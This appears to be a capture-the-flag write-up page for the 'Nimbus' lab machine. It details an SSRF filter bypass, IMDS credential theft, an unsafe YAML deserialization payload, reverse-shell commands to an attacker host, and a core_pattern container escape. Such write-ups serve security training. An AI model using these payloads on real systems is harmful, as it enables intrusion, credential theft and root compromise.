@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nimbus — HTB Writeup</title>
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="stylesheet" href="/inter-font.css">
+    <link rel="stylesheet" href="/fontawesome.css">
+    <link rel="stylesheet" href="writeup.css">
+</head>
+<body>
+
+    <nav class="nav">
+        <a href="/htb/" class="nav-back"><i class="fas fa-arrow-left"></i> Writeups</a>
+        <span class="nav-title">Nimbus</span>
+        <span></span>
+    </nav>
+
+    <div class="writeup-page" id="page" style="display:none">
+
+        <header class="writeup-header">
+            <div class="wh-meta">
+                <span class="wr-tag machine">Machine</span>
+                <span class="wr-tag hard">Hard</span>
+                <span class="wr-os"><i class="fab fa-linux"></i> Linux</span>
+            </div>
+            <h1 class="wh-title">Nimbus</h1>
+            <p class="wh-summary">Chained exploitation through SSRF → IMDS credential theft → SQS injection with unsafe YAML deserialization → privileged CodeBuild container → core_pattern kernel escape.</p>
+        </header>
+
+        <article class="writeup-body">
+
+            <section class="wb-section">
+                <h2>Attack Chain Overview</h2>
+                <div class="chain-table">
+                    <div class="chain-row">
+                        <span class="chain-stage">SSRF</span>
+                        <span class="chain-desc">Octal-encoded IP + <code>.yaml</code> query string bypasses substring denylist on the job URL fetcher</span>
+                    </div>
+                    <div class="chain-row">
+                        <span class="chain-stage">Cred theft</span>
+                        <span class="chain-desc">IMDS reachable via SSRF → IAM role credentials for <code>nimbus-web-role</code></span>
+                    </div>
+                    <div class="chain-row">
+                        <span class="chain-stage">SQS injection</span>
+                        <span class="chain-desc">Stolen role can send to the job queue discovered via <code>sqs list-queues</code></span>
+                    </div>
+                    <div class="chain-row">
+                        <span class="chain-stage">Worker RCE</span>
+                        <span class="chain-desc"><code>yaml.load()</code> with unsafe loader + <code>script</code> field passed to <code>python3 -c</code></span>
+                    </div>
+                    <div class="chain-row">
+                        <span class="chain-stage">Priv esc</span>
+                        <span class="chain-desc">LocalStack reachable by container IP; privileged CodeBuild project created without front-door IAM</span>
+                    </div>
+                    <div class="chain-row">
+                        <span class="chain-stage">UID bypass</span>
+                        <span class="chain-desc">Entrypoint trusts <code>id</code>; overridden via <code>BASH_FUNC_id%%</code> env variable</span>
+                    </div>
+                    <div class="chain-row">
+                        <span class="chain-stage">Escape</span>
+                        <span class="chain-desc">Privileged container writes <code>core_pattern</code>; pipe handler runs on host as root via overlay upperdir bridge</span>
+                    </div>
+                </div>
+            </section>
+
+            <section class="wb-section">
+                <h2>1. Reconnaissance</h2>
+                <p>Initial port scan reveals two services — both patched, no version-CVE path:</p>
+                <pre><code>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    nginx 1.24.0 (Ubuntu)</code></pre>
+                <p>Port 80 redirects to a vhost. Add it and enumerate:</p>
+                <pre><code>curl -v http://&lt;IP&gt;/ 2>&amp;1 | grep -i location
+# Location: http://nimbus.htb/
+
+echo "&lt;IP&gt; nimbus.htb" | sudo tee -a /etc/hosts
+ffuf -u http://nimbus.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -fc 404</code></pre>
+                <p>Three endpoints: <code>/</code>, <code>/login</code>, <code>/jobs</code>. Key info leaks from <code>/login</code>: SSO is in migration, the job submitter is <strong>unauthenticated</strong>, and a user <strong>marcus</strong> exists.</p>
+                <p>The healthcheck endpoint is the pivot:</p>
+                <pre><code>curl -s http://nimbus.htb/api/v1/health</code></pre>
+                <pre><code>{
+  "services": {
+    "queue":     { "endpoint": "http://aws.nimbus.htb", "status": "ok" },
+    "scheduler": { "endpoint": "http://aws.nimbus.htb" },
+    "storage":   { "endpoint": "http://aws.nimbus.htb" }
+  },
+  "status": "healthy",
+  "version": "1.4.2"
+}</code></pre>
+                <p>Reveals the <code>aws.nimbus.htb</code> vhost — a LocalStack-style fake AWS endpoint.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>2. SSRF → IMDS Credential Theft</h2>
+                <p>The <code>/jobs/preview</code> URL field has two filters: the URL must contain <code>.yaml</code>/<code>.yml</code>, and the literal string <code>169.254.169.254</code> is blocked.</p>
+                <p><strong>Bypass:</strong> write the IMDS IP in octal (<code>0251.0376.0251.0376</code>) and satisfy the YAML extension requirement with a query string.</p>
+                <pre><code># First, discover the role name
+curl -s -X POST http://nimbus.htb/jobs/preview \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml'
+
+# Then pull its creds
+curl -s -X POST http://nimbus.htb/jobs/preview \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml'</code></pre>
+                <p>Response contains <code>AccessKeyId</code>, <code>SecretAccessKey</code>, <code>Token</code>, and <code>Expiration</code> for <code>nimbus-web-role</code>.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>3. AWS Enumeration via LocalStack</h2>
+                <pre><code>echo "&lt;IP&gt; aws.nimbus.htb" | sudo tee -a /etc/hosts
+
+export AWS_ACCESS_KEY_ID="&lt;stolen&gt;"
+export AWS_SECRET_ACCESS_KEY="&lt;stolen&gt;"
+export AWS_SESSION_TOKEN="&lt;stolen&gt;"
+export AWS_DEFAULT_REGION="us-east-1"
+
+aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
+aws --endpoint-url http://aws.nimbus.htb sqs list-queues</code></pre>
+                <pre><code>{ "QueueUrls": ["http://floci:4566/847219365028/nimbus-jobs"] }</code></pre>
+                <p>The queue URL exposes an internal hostname <code>floci</code> on port <code>4566</code> — the actual LocalStack container. The web role can send SQS messages.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>4. SQS Injection → Worker RCE</h2>
+                <p>The worker deserializes message bodies with the <strong>unsafe</strong> <code>yaml.Loader</code>, then runs the <code>script</code> field via <code>python3 -c</code>. Either vector gives execution.</p>
+                <pre><code>nc -lvnp 4444</code></pre>
+                <pre><code>aws --endpoint-url http://aws.nimbus.htb sqs send-message \
+  --queue-url http://floci:4566/847219365028/nimbus-jobs \
+  --message-body '!!python/object/apply:os.system ["bash -c \"bash -i >&amp; /dev/tcp/&lt;LHOST&gt;/4444 0>&amp;1\""]'</code></pre>
+                <p>Worker polls the queue, deserializes, executes → reverse shell as <code>worker</code>. Grab <code>user.txt</code>.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>5. Privilege Escalation: Privileged CodeBuild Container</h2>
+                <p>The worker role is denied <code>codebuild:*</code> on the public endpoint, but LocalStack is reachable directly by container IP — without the same IAM restrictions:</p>
+                <pre><code>python3 -c "import socket; print(socket.gethostbyname('floci'))"
+# 172.18.0.2</code></pre>
+                <pre><code>aws --endpoint-url http://172.18.0.2:4566 codebuild create-project \
+  --name pwn \
+  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - bash -i >& /dev/tcp/&lt;LHOST&gt;/4445 0>&1"}' \
+  --artifacts '{"type":"NO_ARTIFACTS"}' \
+  --environment '{"type":"LINUX_CONTAINER","computeType":"BUILD_GENERAL1_SMALL","image":"floci/floci:latest","privilegedMode":true}' \
+  --service-role arn:aws:iam::847219365028:role/nimbus-worker-role</code></pre>
+                <p><strong>UID-drop bypass:</strong> the entrypoint calls <code>id</code> and drops root if UID is 0. Export a bash function that shadows the <code>id</code> binary:</p>
+                <pre><code>nc -lvnp 4445</code></pre>
+                <pre><code>aws --endpoint-url http://172.18.0.2:4566 codebuild start-build \
+  --project-name pwn \
+  --environment-variables-override \
+    '[{"name":"BASH_FUNC_id%%","value":"() { echo uid=1000; }","type":"PLAINTEXT"}]'</code></pre>
+                <p>The entrypoint is fooled, build container stays root, reverse shell connects with full capabilities (<code>CapEff: 000001ffffffffff</code>).</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>6. Container Escape via core_pattern</h2>
+                <p>A privileged container with <code>CAP_SYS_ADMIN</code> can write <code>/proc/sys/kernel/core_pattern</code>. A pipe-prefixed value runs that program on the <strong>host as root</strong> on any core dump. The container's overlay upperdir bridges the container filesystem to the host.</p>
+                <pre><code># Find the upperdir path
+UDIR=$(grep -o 'upperdir=[^,]*' /proc/self/mountinfo | cut -d= -f2)
+
+# Write the handler inside the container (= upperdir on the host)
+printf '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt\nchmod 777 %s/rootflag.txt\n' \
+  "$UDIR" "$UDIR" > /x.sh
+chmod +x /x.sh
+
+# Point core_pattern at the host-visible path
+echo "|${UDIR}/x.sh" > /proc/sys/kernel/core_pattern
+
+# Trigger a core dump
+ulimit -c unlimited
+sleep 100 &amp; kill -SEGV $!
+
+# Read the flag from the worker shell
+cat ${UDIR}/rootflag.txt</code></pre>
+
+                <h3>Gotchas</h3>
+                <ul>
+                    <li>Upgrade to a real PTY before triggering — bare reverse shells throw <code>tcsetattr</code> errors that break the dump path.</li>
+                    <li>The upperdir changes every build — re-read <code>/proc/self/mountinfo</code> in the current container.</li>
+                    <li>Write the handler to <code>/x.sh</code> (container path), not directly to <code>${UDIR}</code>.</li>
+                    <li>Add a <code>id &gt; ${UDIR}/proof</code> line when debugging to confirm handler execution.</li>
+                </ul>
+            </section>
+
+            <section class="wb-section">
+                <h2>Flags</h2>
+                <div class="flag-grid">
+                    <div class="flag-item">
+                        <span class="flag-label">User</span>
+                        <code class="flag-val">user.txt obtained ✓</code>
+                    </div>
+                    <div class="flag-item">
+                        <span class="flag-label">Root</span>
+                        <code class="flag-val">root.txt obtained ✓</code>
+                    </div>
+                </div>
+            </section>
+
+        </article>
+    </div>
+
+    <script>
+    const SESSION_KEY = 'htb_auth';
+    if (!sessionStorage.getItem(SESSION_KEY)) {
+        window.location.href = '/htb/';
+    } else {
+        document.getElementById('page').style.display = 'block';
+    }
+    </script>
+
+</body>
+</html>
